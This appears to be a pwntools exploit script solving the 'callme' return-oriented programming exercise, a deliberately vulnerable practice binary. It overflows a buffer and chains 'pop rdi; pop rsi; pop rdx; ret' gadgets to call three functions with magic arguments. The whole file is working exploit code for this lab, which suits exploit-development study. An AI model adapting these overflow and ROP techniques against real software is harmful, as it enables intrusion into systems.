#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
 
payload = cyclic(40, n=8)  
payload += p64(0x00000000004006be) # the extra ret instruction
payload += p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret
payload += p64(0xdeadbeefdeadbeef) # first argument to callme_one
payload += p64(0xcafebabecafebabe) # second argument to callme_one
payload += p64(0xd00df00dd00df00d) # third arg to callme_one
payload += p64(0x0000000000400720) # address of callme_one
payload += p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret
payload += p64(0xdeadbeefdeadbeef) # first argument to callme_two
payload += p64(0xcafebabecafebabe) # second argument to callme_two
payload += p64(0xd00df00dd00df00d) # third arg to callme_two
payload += p64(0x0000000000400740) # address of callme_two
payload += p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret
payload += p64(0xdeadbeefdeadbeef) # first argument to callme_three
payload += p64(0xcafebabecafebabe) # second argument to callme_three
payload += p64(0xd00df00dd00df00d) # third arg to callme_three
payload += p64(0x00000000004006f0) # address of callme_three

p = gdb.debug("./callme")
p.send(payload)
p.interactive()


















